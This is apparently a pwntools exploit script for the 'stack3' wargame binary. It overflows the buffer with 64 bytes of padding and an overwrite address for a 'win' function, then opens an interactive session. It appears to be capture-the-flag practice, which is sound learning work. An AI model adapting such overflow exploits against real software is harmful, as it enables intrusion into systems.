from pwn import *

win_address = p32(0x8048424)
padding = b'a'*64

final = padding+win_address

p = process('./stack3')

p.sendline(final)
p.interactive()
